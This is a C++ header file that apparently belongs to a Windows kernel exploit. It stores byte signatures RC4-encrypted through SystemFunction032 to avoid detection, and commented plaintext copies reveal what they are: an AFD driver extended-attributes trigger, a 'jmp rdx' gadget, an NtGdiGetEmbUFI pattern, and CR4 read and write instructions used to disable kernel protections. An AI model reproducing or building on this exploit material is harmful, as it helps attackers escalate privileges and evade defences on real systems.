#pragma once
#include "Framework.hpp"
#include "XorStr.hpp"

#include <Windows.h>
#include <vector>


///unencrypted
//unsigned char extendedAtts[] = {
//    0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1E, 0x00, 0x41, 0x66, 0x64, 0x4F, 0x70, 0x65, 0x6E, 0x50,
//    0x61, 0x63, 0x6B, 0x65, 0x74, 0x58, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
//    0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
//    0x00, 0x00, 0x00, 0x00, 0x60, 0xEF, 0x3D, 0x47, 0xFE };
//
//unsigned char rdxJmpCodePattern[] = { 0xFF, 0xE2 };
//
//unsigned char ntGdiGetEmbUFIPattern[] = { 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8B, 0x05, 0x0D, 0x45, 0x06, 0x00, 0x4D, 0x8B, 0xD9, 0x48, 0x85, 0xC0, 0x74, 0x2A };
//
//unsigned char readCr4Pattern[] = { 0x41, 0x0F, 0x20, 0xE0 };
//
//unsigned char writeCr4[] = { 0x0F, 0x22, 0xE0 };




///encrypted
//unsigned char extendedAtts[] = {
//        0x52, 0x19, 0xEB, 0x8F, 0x39, 0x31, 0xFC, 0x32, 0xD0, 0x9C, 0x55, 0xD2, 0xB5, 0x57, 0x6B, 0x6F,
//        0xCC, 0x97, 0x6C, 0x66, 0x34, 0x2A, 0x94, 0xA5, 0xFD, 0xD3, 0xA8, 0xA0, 0x59, 0x3C, 0xAE, 0x2A,
//        0xE3, 0x93, 0x8D, 0xB8, 0x47, 0xD2, 0xEA, 0xD4, 0xDB, 0xCD, 0xB, 0x78, 0x7E, 0xB3, 0xF3, 0xD7,
//        0xFF, 0x99, 0x3A, 0xD7, 0x78, 0x55, 0x8B, 0xAE, 0x49 };
//
//
//
//unsigned char rdxJmpCodePattern[] = {
//        0xAD, 0xFB };
//
//
//
//unsigned char ntGdiGetEmbUFIPattern[] = {
//        0x1A, 0x9A, 0x7, 0xC7, 0x71, 0xB5, 0xE7, 0x3F, 0xD4, 0xFC, 0x31, 0xD0, 0x4E, 0xEB, 0x4D, 0xBA,
//        0x6D, 0x80, 0x2D };
//
//
//
//unsigned char readCr4Pattern[] = {
//        0x13, 0x16, 0xCB, 0x6F };
//
//
//
//unsigned char writeCr4Pattern[] = { 
//  0x5D, 0x3B, 0xB };





class Shellcode
{
public:
    /// <summary>
    /// decrypt/encrypt function pointer
    /// </summary>
    void* systemFunction032Ptr = nullptr;
private:
    /// <summary>
    /// internal functions
    /// </summary>
    static bool DecryptShellcode(__in PBYTE pPayloadData, __in std::size_t szPayload);
    static void PrintHexData(__in const char* Name, __in PBYTE Data, __in std::size_t Size);
 

    struct ExtendedAttributes
    {
    private:
        unsigned char extendedAtts[57] = {
       0x52, 0x19, 0xEB, 0x8F, 0x39, 0x31, 0xFC, 0x32, 0xD0, 0x9C, 0x55, 0xD2, 0xB5, 0x57, 0x6B, 0x6F,
       0xCC, 0x97, 0x6C, 0x66, 0x34, 0x2A, 0x94, 0xA5, 0xFD, 0xD3, 0xA8, 0xA0, 0x59, 0x3C, 0xAE, 0x2A,
       0xE3, 0x93, 0x8D, 0xB8, 0x47, 0xD2, 0xEA, 0xD4, 0xDB, 0xCD, 0xB, 0x78, 0x7E, 0xB3, 0xF3, 0xD7,
       0xFF, 0x99, 0x3A, 0xD7, 0x78, 0x55, 0x8B, 0xAE, 0x49 };

    public:
        const std::size_t Size()
        {
            return sizeof(this->extendedAtts);
        }
        
        PBYTE DecryptSig()
        {
          
            if (!Shellcode::DecryptShellcode(this->extendedAtts, sizeof(this->extendedAtts)))
            {
                return nullptr;
            }
            return this->extendedAtts;
        }

        bool EncryptSig()
        {
            if (!Shellcode::DecryptShellcode(this->extendedAtts, sizeof(this->extendedAtts)))
            {
                return false;
            }
            return true;
        }

        void PrintSig()
        {
            Shellcode::PrintHexData(xorstr_("extendedAttributes"), this->extendedAtts, this->Size());
        }

        const PBYTE Get()
        {
            return this->extendedAtts;
        }

    };

    struct RdxJmpCode
    {
    private:
        unsigned char rdxJmpCodePattern[2] = {
            0xAD, 0xFB };
    public:
        const std::size_t Size()
        {
            return sizeof(this->rdxJmpCodePattern);
        }
        
        PBYTE DecryptSig()
        {

            if (!Shellcode::DecryptShellcode(this->rdxJmpCodePattern, this->Size()))
            {
                return nullptr;
            }
            return this->rdxJmpCodePattern;
        }

        bool EncryptSig()
        {
            if (!Shellcode::DecryptShellcode(this->rdxJmpCodePattern, this->Size()))
            {
                return false;
            }
            return true;
        }

        void PrintSig()
        {
            Shellcode::PrintHexData(xorstr_("extendedAttributes"), this->rdxJmpCodePattern, this->Size());
        }

        const PBYTE Get()
        {
            return this->rdxJmpCodePattern;
        }
    };

    struct NtGdiGetEmbUFI
    {
    private:
        unsigned char ntGdiGetEmbUFIPattern[19] = {
            0x1A, 0x9A, 0x7, 0xC7, 0x71, 0xB5, 0xE7, 0x3F, 0xD4, 0xFC, 0x31, 0xD0, 0x4E, 0xEB, 0x4D, 0xBA,
            0x6D, 0x80, 0x2D };
    public:
        const std::size_t Size()
        {
            return sizeof(this->ntGdiGetEmbUFIPattern);
        }
        
        PBYTE DecryptSig()
        {

            if (!Shellcode::DecryptShellcode(this->ntGdiGetEmbUFIPattern, this->Size()))
            {
                return nullptr;
            }
            return this->ntGdiGetEmbUFIPattern;
        }

        bool EncryptSig()
        {
            if (!Shellcode::DecryptShellcode(this->ntGdiGetEmbUFIPattern, this->Size()))
            {
                return false;
            }
            return true;
        }

        void PrintSig()
        {
            Shellcode::PrintHexData(xorstr_("extendedAttributes"), this->ntGdiGetEmbUFIPattern, this->Size());
        }

        const PBYTE Get()
        {
            return this->ntGdiGetEmbUFIPattern;
        }

    };

    struct ReadCr4
    {
    private:
        unsigned char readCr4Pattern[4] = {
            0x13, 0x16, 0xCB, 0x6F };
    public:
        const std::size_t Size()
        {
            return sizeof(this->readCr4Pattern);
        }
        
        PBYTE DecryptSig()
        {

            if (!Shellcode::DecryptShellcode(this->readCr4Pattern, this->Size()))
            {
                return nullptr;
            }
            return this->readCr4Pattern;
        }

        bool EncryptSig()
        {
            if (!Shellcode::DecryptShellcode(this->readCr4Pattern, this->Size()))
            {
                return false;
            }
            return true;
        }

        void PrintSig()
        {
            Shellcode::PrintHexData(xorstr_("extendedAttributes"), this->readCr4Pattern, this->Size());
        }

        const PBYTE Get()
        {
            return this->readCr4Pattern;
        }

    };

    struct WriteCr4
    {
    private:
        unsigned char writeCr4Pattern[3] = {
       0x5D, 0x3B, 0xB };
    public:
        const std::size_t Size()
        {
            return sizeof(this->writeCr4Pattern);
        }
        
        PBYTE DecryptSig()
        {

            if (!Shellcode::DecryptShellcode(this->writeCr4Pattern, this->Size()))
            {
                return nullptr;
            }
            return this->writeCr4Pattern;
        }

        bool EncryptSig()
        {
            if (!Shellcode::DecryptShellcode(this->writeCr4Pattern, this->Size()))
            {
                return false;
            }
            return true;
        }

        void PrintSig()
        {
            Shellcode::PrintHexData(xorstr_("extendedAttributes"), this->writeCr4Pattern, this->Size());
        }

        const PBYTE Get()
        {
            return this->writeCr4Pattern;
        }
    };

public:

    ExtendedAttributes extendedAttributesSignature;
    RdxJmpCode rdxJmpCodeSignature;
    WriteCr4 writeCr4Signature;
    ReadCr4 readCr4Signature;
    NtGdiGetEmbUFI ntGdiGetEmbUFISignature;
};

inline Shellcode Sigs;


using fnSystemFunction032 = NTSTATUS (__stdcall*)(USTRING*, USTRING*);